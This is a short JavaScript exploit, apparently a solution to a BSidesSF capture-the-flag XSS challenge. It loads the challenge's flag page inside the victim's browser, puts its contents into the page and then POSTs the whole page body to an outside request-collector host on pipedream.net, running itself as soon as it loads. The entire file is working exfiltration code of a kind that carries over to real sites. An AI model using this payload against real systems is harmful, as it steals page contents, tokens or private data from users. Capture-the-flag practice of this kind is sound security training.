async function load_home(_callback) {
  let url = 'https://web-tutorial-1-a1ef0161.challenges.bsidessf.net/xss-two-flag';

  document.body.innerHTML = await (await fetch(url, {mode: 'no-cors'})).text();
  _callback();
}

function exploit() {
  load_home(function () {
    var body = document.body.innerHTML;
    fetch('https://eny56ahhsgh5.x.pipedream.net', {
      method: 'POST',
      body: body
    })
  });
}

exploit();
